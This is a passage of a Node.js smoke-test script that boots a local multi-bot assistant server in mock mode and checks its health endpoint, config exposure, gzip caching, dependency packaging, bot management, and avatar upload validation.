#!/usr/bin/env node
/**
 * smoke.mjs - boots the real server in mock mode on a free port, drives a full
 * scenario over HTTP + SSE, and prints PASS/FAIL per assertion.
 *
 * It never touches the project's own data/: config/, skills/, public/ and
 * workspace/ are copied into a temp directory and ASSIST_HOME points there, so a
 * green run leaves the repo exactly as it was.
 *
 * Exit code 0 = every assertion passed. Non-zero = something is broken.
 */

import { spawn } from 'node:child_process';
import fsp from 'node:fs/promises';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { fileURLToPath } from 'node:url';

const REPO = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

/**
 * Repo source, with LF endings. Assertions quote source lines, and a Windows
 * checkout (core.autocrlf=true) writes CRLF - the product is the same file.
 */
async function readText(rel) {
  return (await fsp.readFile(new URL(rel, import.meta.url), 'utf8')).replace(/\r\n/g, '\n');
}

// ---------------------------------------------------------------------------
// tiny assertion harness
// ---------------------------------------------------------------------------

const results = [];

function record(ok, name, detail = '') {
  results.push({ ok, name, detail });
  const line = ok ? `PASS  ${name}` : `FAIL  ${name}${detail ? `  <- ${detail}` : ''}`;
  console.log(line);
  return ok;
}

function check(name, condition, detail = '') {
  return record(Boolean(condition), name, condition ? '' : detail);
}

function checkEqual(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  return record(ok, name, ok ? '' : `expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
}

function skip(name, why) {
  console.log(`SKIP  ${name}  (${why})`);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** Run an async fn and return the error code it throws, or null. */
async function errorCode(fn) {
  try {
    await fn();
    return null;
  } catch (err) {
    return err.code || err.message;
  }
}

/**
 * Run one scenario. A throw becomes a single FAIL instead of taking down the
 * whole run, so a smoke run always reports the full picture.
 */
async function stage(name, fn) {
  try {
    await fn();
  } catch (err) {
    record(false, `stage "${name}" completed without throwing`, err?.message || String(err));
  }
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

let child = null;
let home = null;
let base = '';
let publicBase = '';

async function main() {
  home = await fsp.mkdtemp(path.join(os.tmpdir(), 'assist-smoke-'));
  await seedHome(home);
  pointEnvAt(home);

  // Modules that read ASSIST_HOME at import time must be imported only after the
  // environment is pointed at the temp home.
  const approvals = await import('../src/approvals.mjs');
  const routines = await import('../src/routines.mjs');
  const skillsMod = await import('../src/skills.mjs');
  const memoryMod = await import('../src/memory.mjs');
  const toolsMod = await import('../src/tools.mjs');
  const authMod = await import('../src/auth.mjs');
  const settingsMod = await import('../src/settings.mjs');
  const modelMod = await import('../src/model.mjs');
  const botsMod = await import('../src/bots.mjs');
  const groupsMod = await import('../src/groups.mjs');
  const storeMod = await import('../src/store.mjs');
  const browserMod = await import('../src/browser.mjs');
  const devicesMod = await import('../src/devices.mjs');

  await bootServer();

  try {
    await stage('basics', scenarioBasics);
    await stage('settings', () => scenarioSettings({ settingsMod }));
    await stage('auth gate', () => scenarioAuth({ auth: authMod, devicesMod }));
    await stage('pairing', scenarioPairing);
    await stage('phone pairing link', scenarioPairingLink);
    await stage('bots', scenarioBots);
    await stage('bot avatars', scenarioBotAvatars);
    await stage('chief turn', scenarioChiefTurn);
    await stage('bot previews', scenarioBotPreviews);
    await stage('bot management', () => scenarioBotManagement({ approvals, botsMod, groupsMod, toolsMod }));
    await stage('group chats', () => scenarioGroups({ botsMod, groupsMod, toolsMod }));
    await stage('mock streaming', scenarioMockStreaming);
    await stage('handoff', scenarioHandoff);
    await stage('approval approve', scenarioApprovalApprove);
    await stage('approval deny', scenarioApprovalDeny);
    await stage('routine needs approval', scenarioRoutineNeedsApproval);
    await stage('routine success', scenarioRoutineSuccess);
    await stage('skill save', scenarioSkillSaveViaBot);
    await stage('error shapes', scenarioErrors);
    await stage('attachments and voice', scenarioAttachmentsAndVoice);
    await stage('browser automation', () => scenarioBrowser({ toolsMod, browserMod, home }));
    await stage('unit checks', () =>
      unitChecks({ approvals, routines, skillsMod, memoryMod, toolsMod, botsMod, storeMod, home }),
    );
    await stage('machines and policy', () => scenarioMachinesAndPolicy({ approvals, toolsMod }));
    await stage('streaming parser', () => scenarioStreamingParser({ modelMod }));
    await stage('crash recovery', scenarioCrashRecovery);
  } finally {
    await stopChild();
    // Leave the temp dir behind only when something failed, so it can be inspected.
    const failed = results.filter((r) => !r.ok).length;
    if (!failed) await fsp.rm(home, { recursive: true, force: true }).catch(() => {});
    else console.log(`\n(temp home kept for inspection: ${home})`);
  }

  const failed = results.filter((r) => !r.ok);
  console.log('');
  console.log(`RESULT  ${results.length - failed.length}/${results.length} assertions passed`);
  if (failed.length) {
    for (const f of failed) console.log(`  - ${f.name}${f.detail ? `  <- ${f.detail}` : ''}`);
    process.exitCode = 1;
  } else {
    console.log('RESULT  smoke test passed');
    process.exitCode = 0;
  }
}

// ---------------------------------------------------------------------------
// environment
// ---------------------------------------------------------------------------

async function seedHome(target) {
  const dirs = ['config', 'skills', 'public', 'workspace'];
  for (const dir of dirs) {
    const src = path.join(REPO, dir);
    try {
      await fsp.cp(src, path.join(target, dir), { recursive: true });
    } catch (err) {
      if (err.code !== 'ENOENT') throw err;
    }
  }
  // The product ships one bot. The roster, group and grant scenarios need a
  // few specialists, so they come from test fixtures, never from config/.
  await fsp.cp(path.join(REPO, 'scripts', 'fixtures', 'bots'), path.join(target, 'config', 'bots'), { recursive: true });
  // data/ is created by the server itself; do not copy the real one.
}

function pointEnvAt(target) {
  process.env.ASSIST_HOME = target;
  process.env.ASSIST_DATA_DIR = path.join(target, 'data');
  process.env.ASSIST_WORKSPACE_DIR = path.join(target, 'workspace');
  process.env.ASSIST_MODEL_PROVIDER = 'mock';
  delete process.env.ASSIST_API_KEY;
  // The browser tools auto-detect Chrome/Edge, so a *missing* binary is simulated
  // by pointing CHROME_PATH at a file that does not exist: that keeps the
  // not_configured assertion deterministic on any machine. The browser stage
  // deletes it again to exercise real auto-detection.
  process.env.CHROME_PATH = path.join(target, 'no-such-browser.exe');
  delete process.env.ALLOW_PRIVATE;
  process.env.PORT = '0';
}

async function startServerChild(target, extraEnv = {}) {
  const env = { ...process.env, ASSIST_HOME: target, PORT: '0', ...extraEnv };
  const proc = spawn(process.execPath, [path.join(REPO, 'src', 'server.mjs')], {
    env,
    stdio: ['ignore', 'pipe', 'pipe'],
    windowsHide: true,
  });

  const ready = await new Promise((resolve, reject) => {
    let buffer = '';
    let stderr = '';
    const timer = setTimeout(() => reject(new Error(`server did not announce readiness in 20s\n${stderr}`)), 20000);

    proc.stdout.on('data', (chunk) => {
      buffer += chunk.toString('utf8');
      for (const line of buffer.split('\n')) {
        const trimmed = line.trim();
        if (!trimmed.startsWith('{')) continue;
        try {
          const parsed = JSON.parse(trimmed);
          if (parsed.event === 'ready') {
            clearTimeout(timer);
            resolve(parsed);
          }
        } catch {
          /* partial line, keep buffering */
        }
      }
      // Keep only the tail so the buffer cannot grow forever.
      if (buffer.length > 20000) buffer = buffer.slice(-4000);
    });

    proc.stderr.on('data', (chunk) => {
      stderr += chunk.toString('utf8');
      if (stderr.length > 20000) stderr = stderr.slice(-8000);
    });

    proc.on('exit', (code) => {
      clearTimeout(timer);
      reject(new Error(`server exited early with code ${code}\n${stderr}`));
    });
  });

  return { child: proc, url: ready.url, provider: ready.provider, ready };
}

/** Boot (or reboot) the real server on the temp home and point the helpers at it. */
async function bootServer() {
  const started = await startServerChild(home);
  child = started.child;
  base = started.url;
  publicBase = started.ready?.publicPort ? `http://127.0.0.1:${started.ready.publicPort}` : '';
  return started;
}

/** Power-cut simulation: no SIGTERM, no graceful cleanup, no chance to write. */
async function killChildHard() {
  const proc = child;
  child = null;
  if (!proc || proc.exitCode !== null) return;
  const exited = new Promise((resolve) => proc.once('exit', resolve));
  proc.kill('SIGKILL');
  await Promise.race([exited, sleep(5000)]);
}

async function waitUntil(predicate, timeoutMs = 5000, label = 'condition') {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (await predicate()) return true;
    await sleep(50);
  }
  throw new Error(`timed out waiting for ${label}`);
}

async function stopChild() {
  if (!child) return;
  const proc = child;
  child = null;
  await stopProcess(proc);
}

/** Stop a server we started outside `child` (the phone-pairing scenario). */
async function stopProcess(proc) {
  if (!proc || proc.exitCode !== null) return;
  const exited = new Promise((resolve) => proc.once('exit', resolve));
  proc.kill('SIGTERM');
  const timedOut = await Promise.race([
    exited.then(() => false),
    sleep(4000).then(() => true),
  ]);
  if (timedOut) {
    proc.kill('SIGKILL');
    await Promise.race([exited, sleep(2000)]);
  }
}

// ---------------------------------------------------------------------------
// HTTP helpers
// ---------------------------------------------------------------------------

async function api(pathname, { method = 'GET', body, headers = {} } = {}) {
  const res = await fetch(`${base}${pathname}`, {
    method,
    headers: { ...(body !== undefined ? { 'content-type': 'application/json' } : {}), ...headers },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    /* not json */
  }
  return { status: res.status, json, text, headers: res.headers };
}

/** Same as api(), but for endpoints whose body/response is raw bytes. */
async function apiRaw(pathname, { method = 'GET', body, contentType } = {}) {
  const res = await fetch(`${base}${pathname}`, {
    method,
    headers: contentType ? { 'content-type': contentType } : undefined,
    body,
  });
  const buffer = Buffer.from(await res.arrayBuffer());
  let json = null;
  try {
    json = JSON.parse(buffer.toString('utf8'));
  } catch {
    /* an image, which is the point */
  }
  return { status: res.status, buffer, json, headers: res.headers };
}

// --- generated images (no dependencies: PNG is IHDR/IDAT/IEND + zlib) --------

function crc32(buffer) {
  let crc = 0xffffffff;
  for (const byte of buffer) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit += 1) crc = (crc >>> 1) ^ (0xedb88320 & -(crc & 1));
  }
  return (crc ^ 0xffffffff) >>> 0;
}

/** A real, decodable truecolour PNG. */
function makePng(width = 4, height = 4, rgb = [0x8b, 0x5c, 0xff]) {
  const stride = width * 3 + 1;
  const raw = Buffer.alloc(stride * height);
  for (let y = 0; y < height; y += 1) {
    raw[y * stride] = 0; // filter type 0
    for (let x = 0; x < width; x += 1) {
      const at = y * stride + 1 + x * 3;
      raw[at] = rgb[0];
      raw[at + 1] = rgb[1];
      raw[at + 2] = rgb[2];
    }
  }
  const chunk = (type, data) => {
    const length = Buffer.alloc(4);
    length.writeUInt32BE(data.length, 0);
    const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(body), 0);
    return Buffer.concat([length, body, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 2; // colour type: truecolour
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', ihdr),
    chunk('IDAT', zlib.deflateSync(raw)),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

/** A minimal RIFF/WEBP envelope - enough for the server's content sniffing. */
function makeWebp() {
  const buffer = Buffer.alloc(24);
  buffer.write('RIFF', 0, 'ascii');
  buffer.writeUInt32LE(16, 4);
  buffer.write('WEBP', 8, 'ascii');
  buffer.write('VP8L', 12, 'ascii');
  buffer.writeUInt32LE(8, 16);
  return buffer;
}

/** The avatar files for one bot that actually exist on disk. */
async function avatarFilesFor(botId) {
  const names = await fsp.readdir(path.join(home, 'data', 'avatars')).catch(() => []);
  return names.filter((name) => name.slice(0, name.lastIndexOf('.')) === botId).sort();
}


/** Open the SSE stream and collect every event that arrives. */
async function openStream(botId = '', { groupId = '' } = {}) {
  const controller = new AbortController();
  const filters = [];
  if (botId) filters.push(`botId=${encodeURIComponent(botId)}`);
  if (groupId) filters.push(`groupId=${encodeURIComponent(groupId)}`);
  const res = await fetch(`${base}/api/stream${filters.length ? `?${filters.join('&')}` : ''}`, {
    signal: controller.signal,
    headers: { accept: 'text/event-stream' },
  });
  const events = [];
  let done = false;

  (async () => {
    const decoder = new TextDecoder();
    let buffer = '';
    try {
      for await (const chunk of res.body) {
        buffer += decoder.decode(chunk, { stream: true });
        let split;
        while ((split = buffer.indexOf('\n\n')) !== -1) {
          const frame = buffer.slice(0, split);
          buffer = buffer.slice(split + 2);
          for (const line of frame.split('\n')) {
            if (!line.startsWith('data:')) continue;
            try {
              events.push(JSON.parse(line.slice(5).trim()));
            } catch {
              /* heartbeat/comment */
            }
          }
        }
      }
    } catch {
      /* aborted on purpose */
    } finally {
      done = true;
    }
  })();

  return {
    events,
    get closed() {
      return done;
    },
    waitFor(predicate, timeoutMs = 10000, label = 'event') {
      return new Promise((resolve, reject) => {
        const deadline = Date.now() + timeoutMs;
        const tick = () => {
          const found = events.find(predicate);
          if (found) return resolve(found);
          if (Date.now() > deadline) {
            const seen = events.map((e) => e.type).join(', ');
            return reject(new Error(`timed out waiting for ${label}; saw [${seen}]`));
          }
          setTimeout(tick, 25);
        };
        tick();
      });
    },
    close() {
      controller.abort();
    },
  };
}

/** POST a message and wait for that turn to end. Returns {turnId, events}. */
async function runTurn(botId, text, stream, timeoutMs = 15000) {
  const res = await api(`/api/bots/${botId}/message`, { method: 'POST', body: { text } });
  if (res.status !== 200) throw new Error(`message POST failed (${res.status}): ${res.text}`);
  const turnId = res.json.turnId;
  const end = await stream.waitFor((e) => e.type === 'turn.end' && e.turnId === turnId, timeoutMs, `turn.end for ${turnId}`);
  return { turnId, status: end.status, summary: end.summary, events: stream.events.filter((e) => e.turnId === turnId) };
}

// ---------------------------------------------------------------------------
// scenarios
// ---------------------------------------------------------------------------

async function scenarioBasics() {
  const health = await api('/api/health');
  check('GET /api/health returns 200', health.status === 200, `status ${health.status}`);
  check('health says ok and provider is mock', health.json?.ok === true && health.json?.model?.provider === 'mock', JSON.stringify(health.json?.model));
  check('health reports 3 starter bots', health.json?.bots === 3, `got ${health.json?.bots}`);

  const config = await api('/api/config');
  check('GET /api/config exposes policy without secrets', config.status === 200 && Boolean(config.json?.policy?.denyPatterns?.length));
  check('config contains no api key material', !config.text.includes('sk-') && !config.text.includes('apiKey'));

  const index = await fetch(`${base}/`);
  const html = await index.text();
  check('GET / serves the UI', index.status === 200 && html.includes('<!DOCTYPE html'), `status ${index.status}`);
  check('UI is a single self-contained file (no CDN)', !/https?:\/\/cdn\.|unpkg|jsdelivr/i.test(html));

  // A phone away from home goes through a DERP relay: bytes are the product.
  // node:http is used, not fetch: fetch transparently un-gzips, which would hide
  // exactly the thing being asserted.
  const zlib = await import('node:zlib');
  const rawGet = (pathname, headers = {}) => new Promise((resolve, reject) => {
    const req = http.request(`${base}${pathname}`, { headers }, (res) => {
      const chunks = [];
      res.on('data', (chunk) => chunks.push(chunk));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
    });
    req.on('error', reject);
    req.end();
  });

  const gz = await rawGet('/', { 'accept-encoding': 'gzip' });
  const gunzipped = zlib.gunzipSync(gz.body).toString('utf8');
  check(
    'the app shell is gzipped for clients that ask',
    gz.status === 200 && gz.headers['content-encoding'] === 'gzip' && gunzipped.includes('<!DOCTYPE html'),
    `${gz.headers['content-encoding']} ${gz.body.length}`,
  );
  check(
    'gzip actually makes the shell much smaller',
    gz.body.length > 0 && gz.body.length < Buffer.byteLength(html) / 2,
    `${gz.body.length} of ${Buffer.byteLength(html)}`,
  );
  const etag = gz.headers.etag || '';
  check('static files carry an ETag', /^W\/".+"$/.test(etag), etag);
  const revalidated = await rawGet('/', { 'if-none-match': etag });
  check(
    'a reload revalidates to 304 with no body',
    revalidated.status === 304 && revalidated.body.length === 0,
    `${revalidated.status} ${revalidated.body.length}`,
  );
  // SSE must never be compressed: it is consumed as it arrives.
  check('the streaming endpoint is not gzipped', !/gzip/.test(String((await api('/api/health')).headers?.get('content-encoding') || '')), '');

  const pkg = JSON.parse(await fsp.readFile(path.join(REPO, 'package.json'), 'utf8'));
  const declared = Object.keys(pkg.dependencies || {});
  const devDeclared = Object.keys(pkg.devDependencies || {});
  // Desk used to be dependency-free. v3's one-click remote provisioning needs
  // ssh2 at runtime, so this now guards the dependency *boundary* instead:
  // no casual dependencies, and no devDependencies in the shipped build.
  check(
    'package.json declares only the approved runtime dependency',
    declared.length === 1 && declared[0] === 'ssh2' && devDeclared.length === 0,
    `deps=${declared.join(',')} devDeps=${devDeclared.join(',')}`,
  );
  check('package.json is an ES module package', pkg.type === 'module');

  // Walk the runtime dependency closure (optional native deps excluded) and make
  // sure electron-builder ships every one of them next to the server. asn1's
  // safer-buffer was missed once and broke ssh2 in packaged builds; this keeps
  // that class of mistake from coming back.
  const runtimeTree = new Set();
  const walkDeps = async (name) => {
    if (runtimeTree.has(name)) return;
    runtimeTree.add(name);
    let meta;
    try {
      meta = JSON.parse(await fsp.readFile(path.join(REPO, 'node_modules', name, 'package.json'), 'utf8'));
    } catch { return; }
    for (const child of Object.keys(meta.dependencies || {})) await walkDeps(child);
  };
  for (const name of declared) await walkDeps(name);
  const builderYml = await fsp.readFile(path.join(REPO, 'desktop', 'electron-builder.yml'), 'utf8');
  const notShipped = [...runtimeTree].filter((name) => !builderYml.includes(`from: ../node_modules/${name}`));
  check(
    'desktop package ships the full runtime dependency tree',
    notShipped.length === 0,
    `missing from extraResources: ${notShipped.join(', ')}`,
  );
}

async function scenarioBots() {
  const list = await api('/api/bots');
  check('GET /api/bots returns 3 bots', list.status === 200 && list.json.length === 3, `got ${list.json?.length}`);
  const chief = list.json.find((b) => b.id === 'chief');
  const researcher = list.json.find((b) => b.id === 'researcher');
  const ops = list.json.find((b) => b.id === 'ops');
  check('chief is the primary bot', chief?.primary === true);
  check('researcher is granted web tools but not shell', researcher?.tools.includes('http_fetch') && !researcher.tools.includes('shell'));
  check('ops is granted shell and has strict approvals', ops?.tools.includes('shell') && ops.policy.autoApproveMedium === false);
  check('researcher auto-approves medium risk', researcher?.policy.autoApproveMedium === true);
  check('bots have distinct roles', new Set(list.json.map((b) => b.role)).size === 3);

  const created = await api('/api/bots', { method: 'POST', body: { name: 'Scribe', role: 'writes things down' } });
  check('POST /api/bots creates a bot', created.status === 200 && created.json.bot.id === 'scribe', created.text);
  const afterCreate = await api('/api/bots');
  check('roster grew to 4', afterCreate.json.length === 4);

  const patched = await api('/api/bots/scribe', { method: 'PATCH', body: { role: 'keeps the minutes' } });
  check('PATCH /api/bots/:id updates a field', patched.status === 200 && patched.json.bot.role === 'keeps the minutes');

  const dup = await api('/api/bots', { method: 'POST', body: { name: 'Scribe' } });
  check('duplicate bot id is rejected with 409', dup.status === 409 && dup.json?.error?.code === 'BOT_EXISTS', dup.text);

  const deleted = await api('/api/bots/scribe', { method: 'DELETE' });
  check('DELETE /api/bots/:id removes it', deleted.status === 200 && deleted.json.deleted === true);
  const afterDelete = await api('/api/bots');
  check('roster is back to 3', afterDelete.json.length === 3);
}

const AVATAR_SHAPES = [
  'squircle',
  'circle',
  'blob',
  'star',
  'flower',
  'hex',
  'octagon',
  'diamond',
  'arch',
  'leaf',
  'gem',
  'wave',
  'ring',
  'drop',
  'chip',
];

async function scenarioBotAvatars() {
  // --- every bot exposes the full avatar contract --------------------------
  const list = await api('/api/bots');
  const contractOk = list.json.every(
    (bot) =>
      AVATAR_SHAPES.includes(bot.avatar?.shape) &&
      /^#[0-9a-f]{6}$/.test(bot.avatar?.color || '') &&
      typeof bot.avatar?.hasImage === 'boolean' &&
      (bot.avatar?.imageUrl === null || bot.avatar?.imageUrl === `/api/bots/${bot.id}/avatar`) &&
      typeof bot.avatarColor === 'string',
  );
  check('every bot exposes {shape,color,hasImage,imageUrl} plus avatarColor', contractOk, JSON.stringify(list.json.map((b) => b.avatar)));

  // --- legacy bots: no avatar in the file, a default grown from avatarColor ---
  // The shipped roster may already carry avatars, so this writes a genuinely
  // legacy bot file - the shape every pre-avatar install has - and reads it back
  // through the API.
  const legacyFile = path.join(home, 'config', 'bots', 'legacybot.json');
  await fsp.writeFile(
    legacyFile,
    JSON.stringify(
      {
        id: 'legacybot',
        name: 'Legacy',
        avatarColor: '#123456',
        role: 'from an older install',
        persona: '',
        primary: false,
        tools: [],
        skills: [],
        policy: { autoApproveMedium: false, denyPatterns: [], maxSteps: 12, maxTurnMs: 300000 },
        createdAt: '2025-01-01T00:00:00.000Z',
      },
      null,
      2,
    ),
  );
  const legacyList = await api('/api/bots');
  const legacy = legacyList.json.find((b) => b.id === 'legacybot');
  checkEqual('a legacy bot gets the default squircle avatar', legacy?.avatar, {
    shape: 'squircle',
    color: '#123456',
    hasImage: false,
    imageUrl: null,
  });
  check('a legacy bot still exposes avatarColor unchanged', legacy?.avatarColor === '#123456', legacy?.avatarColor);
  const legacyAfter = JSON.parse(await fsp.readFile(legacyFile, 'utf8'));
  check('reading a legacy bot does not migrate its file', legacyAfter.avatar === undefined, JSON.stringify(legacyAfter.avatar));

  // --- creating a bot with an avatar ---------------------------------------
  const created = await api('/api/bots', {
    method: 'POST',
    body: { name: 'Palette', role: 'keeps the colours honest', avatar: { shape: 'star', color: '#Ff00Aa' } },
  });
  check('POST /api/bots accepts an avatar', created.status === 200 && created.json?.bot?.id === 'palette', created.text);
  checkEqual('the avatar is returned with a lowercased colour', created.json?.bot?.avatar, {
    shape: 'star',
    color: '#ff00aa',
    hasImage: false,
    imageUrl: null,
  });
  check(
    'the avatar colour is mirrored into avatarColor for older clients',
    created.json?.bot?.avatarColor === '#ff00aa',
    created.json?.bot?.avatarColor,
  );
  const paletteFile = JSON.parse(await fsp.readFile(path.join(home, 'config', 'bots', 'palette.json'), 'utf8'));
  checkEqual('the bot file stores only shape and colour', paletteFile.avatar, { shape: 'star', color: '#ff00aa' });

  // --- every shape the UI can draw ----------------------------------------
  for (const shape of AVATAR_SHAPES) {
    const patched = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { shape } } });
    check(
      `avatar shape "${shape}" is accepted`,
      patched.status === 200 && patched.json?.bot?.avatar?.shape === shape,
      patched.text.slice(0, 160),
    );
  }

  // --- garbage in -----------------------------------------------------------
  const badShapes = ['potato', 'round', '', 'Star!', 'squarcle', 42];
  const shapeFailures = [];
  for (const shape of badShapes) {
    const res = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { shape } } });
    if (res.status !== 400 || res.json?.error?.code !== 'AVATAR_BAD_SHAPE') {
      shapeFailures.push(`${JSON.stringify(shape)} -> ${res.status} ${res.json?.error?.code}`);
    }
  }
  check('unknown avatar shapes are rejected with 400 AVATAR_BAD_SHAPE', shapeFailures.length === 0, shapeFailures.join('; '));

  const badColors = ['red', '#fff', '#12345', '#12345g', 'rgb(0,0,0)', 'abcdef', '', null];
  const colorFailures = [];
  for (const color of badColors) {
    const res = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { color } } });
    if (res.status !== 400 || res.json?.error?.code !== 'AVATAR_BAD_COLOR') {
      colorFailures.push(`${JSON.stringify(color)} -> ${res.status} ${res.json?.error?.code}`);
    }
  }
  check('bad avatar colours are rejected with 400 AVATAR_BAD_COLOR', colorFailures.length === 0, colorFailures.join('; '));

  const upperColor = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { color: '#ABCDEF' } } });
  check(
    'an uppercase colour is accepted and stored lowercase',
    upperColor.status === 200 && upperColor.json?.bot?.avatar?.color === '#abcdef',
    upperColor.text.slice(0, 160),
  );

  const notAnObject = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: 'blue' } });
  check(
    'avatar must be an object',
    notAnObject.status === 400 && notAnObject.json?.error?.code === 'AVATAR_INVALID',
    notAnObject.text.slice(0, 160),
  );

  const badCreate = await api('/api/bots', { method: 'POST', body: { name: 'Ugly', avatar: { shape: 'triangle' } } });
  check(
    'POST /api/bots validates the shape too',
    badCreate.status === 400 && badCreate.json?.error?.code === 'AVATAR_BAD_SHAPE',
    badCreate.text.slice(0, 160),
  );

  // --- PATCH avatar only touches the avatar --------------------------------
  const before = (await api('/api/bots/palette')).json.bot;
  const patched = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { color: '#112233' } } });
  check('PATCH avatar.color keeps the shape', patched.json?.bot?.avatar?.shape === 'chip', patched.json?.bot?.avatar?.shape);
  checkEqual('PATCH avatar.color applies the colour', patched.json?.bot?.avatar?.color, '#112233');
  check(
    'PATCH avatar preserves the rest of the bot',
    patched.json?.bot?.name === before.name &&
      patched.json?.bot?.role === before.role &&
      patched.json?.bot?.persona === before.persona &&
      patched.json?.bot?.primary === before.primary &&
      patched.json?.bot?.createdAt === before.createdAt &&
      JSON.stringify(patched.json?.bot?.tools) === JSON.stringify(before.tools) &&
      JSON.stringify(patched.json?.bot?.skills) === JSON.stringify(before.skills) &&
      JSON.stringify(patched.json?.bot?.policy) === JSON.stringify(before.policy),
    JSON.stringify(patched.json?.bot).slice(0, 240),
  );

  // --- upload -> fetch -> replace -> delete --------------------------------
  const png = makePng();
  const upload = await apiRaw('/api/bots/palette/avatar', { method: 'POST', body: png, contentType: 'image/png' });
  check('POST /api/bots/:id/avatar stores the bytes', upload.status === 200 && upload.json?.ok === true, upload.buffer.toString('utf8').slice(0, 160));
  checkEqual('upload answers with the image URL', upload.json?.imageUrl, '/api/bots/palette/avatar');

  const withImage = await api('/api/bots/palette');
  check(
    'the bot reports hasImage and imageUrl',
    withImage.json?.bot?.avatar?.hasImage === true && withImage.json?.bot?.avatar?.imageUrl === '/api/bots/palette/avatar',
    JSON.stringify(withImage.json?.bot?.avatar),
  );

  const fetched = await apiRaw('/api/bots/palette/avatar');
  check('GET avatar returns the exact bytes', fetched.status === 200 && Buffer.compare(fetched.buffer, png) === 0, `status ${fetched.status}`);
  checkEqual('GET avatar serves image/png', fetched.headers.get('content-type'), 'image/png');
  checkEqual('an unversioned avatar URL is no-cache', fetched.headers.get('cache-control'), 'no-cache');
  check('content-length matches the image size', Number(fetched.headers.get('content-length')) === png.length);

  const versioned = await apiRaw('/api/bots/palette/avatar?v=1700000000000');
  checkEqual(
    'a versioned avatar URL is immutable for a year',
    versioned.headers.get('cache-control'),
    'private, max-age=31536000, immutable',
  );
  check('a versioned avatar URL returns the same bytes', Buffer.compare(versioned.buffer, png) === 0);

  const stored = await avatarFilesFor('palette');
  checkEqual('the image lives at data/avatars/<botId>.png', stored, ['palette.png']);

  const swapped = await apiRaw('/api/bots/palette/avatar', { method: 'POST', body: makeWebp(), contentType: 'image/webp' });
  check('a second upload in another format is accepted', swapped.status === 200, swapped.buffer.toString('utf8').slice(0, 160));
  checkEqual('one image per bot: the old format is removed', await avatarFilesFor('palette'), ['palette.webp']);
  const webpFetch = await apiRaw('/api/bots/palette/avatar');
  checkEqual('the served content-type follows the stored format', webpFetch.headers.get('content-type'), 'image/webp');

  const removed = await api('/api/bots/palette/avatar', { method: 'DELETE' });
  check('DELETE /api/bots/:id/avatar answers ok', removed.status === 200 && removed.json?.ok === true, removed.text);
  const gone = await apiRaw('/api/bots/palette/avatar');
  check(
    'GET avatar after DELETE is a JSON 404',
    gone.status === 404 && gone.json?.error?.code === 'AVATAR_NOT_FOUND',
    gone.buffer.toString('utf8').slice(0, 160),
  );
  const noImage = await api('/api/bots/palette');
  check(
    'DELETE clears hasImage but keeps the avatar look',
    noImage.json?.bot?.avatar?.hasImage === false &&
      noImage.json?.bot?.avatar?.imageUrl === null &&
      noImage.json?.bot?.avatar?.shape === 'chip' &&
      noImage.json?.bot?.avatar?.color === '#112233',
    JSON.stringify(noImage.json?.bot?.avatar),
  );
  const removedAgain = await api('/api/bots/palette/avatar', { method: 'DELETE' });
  check('DELETE avatar is idempotent', removedAgain.status === 200 && removedAgain.json?.ok === true);

  // --- refusals -----------------------------------------------------------
  const wrongType = await apiRaw('/api/bots/palette/avatar', { method: 'POST', body: png, contentType: 'text/plain' });
  check(
    'a non-image content-type is refused',
    wrongType.status === 400 && wrongType.json?.error?.code === 'AVATAR_BAD_TYPE',
    wrongType.buffer.toString('utf8').slice(0, 160),
  );

  const fakePng = await apiRaw('/api/bots/palette/avatar', {
    method: 'POST',
    body: Buffer.from('<html>definitely not a png</html>'),
    contentType: 'image/png',
  });
  check(
    'bytes that are not an image are refused even when labelled png',
    fakePng.status === 400 && fakePng.json?.error?.code === 'AVATAR_BAD_TYPE',
    fakePng.buffer.toString('utf8').slice(0, 160),
  );

  const tooBig = await apiRaw('/api/bots/palette/avatar', {
    method: 'POST',
    body: Buffer.alloc(2 * 1024 * 1024 + 16),
    contentType: 'image/png',
  });
  check(
    'an image over 2 MB is refused with AVATAR_TOO_LARGE',
    tooBig.status === 400 && tooBig.json?.error?.code === 'AVATAR_TOO_LARGE',
    tooBig.buffer.toString('utf8').slice(0, 160),
  );
  checkEqual('a refused upload leaves no image behind', await avatarFilesFor('palette'), []);

  const unknownBot = await apiRaw('/api/bots/nobody/avatar', { method: 'POST', body: png, contentType: 'image/png' });
  check(
    'uploading an avatar for an unknown bot is a 404',
    unknownBot.status === 404 && unknownBot.json?.error?.code === 'BOT_NOT_FOUND',
    unknownBot.buffer.toString('utf8').slice(0, 160),
  );

  // --- deleting a bot takes its image with it ------------------------------
  await api('/api/bots', { method: 'POST', body: { name: 'Temporary Avatar' } });
  await apiRaw('/api/bots/temporary-avatar/avatar', { method: 'POST', body: png, contentType: 'image/png' });
  const temporaryImage = await avatarFilesFor('temporary-avatar');
  await api('/api/bots/temporary-avatar', { method: 'DELETE' });
  check(
    'deleting a bot deletes its avatar image',
    temporaryImage.length === 1 && (await avatarFilesFor('temporary-avatar')).length === 0,
    temporaryImage.join(','),
  );

  // --- no transcript yet, so no preview ------------------------------------
  const empty = await api('/api/bots');
  check(
    'bots that have never spoken have preview:null',
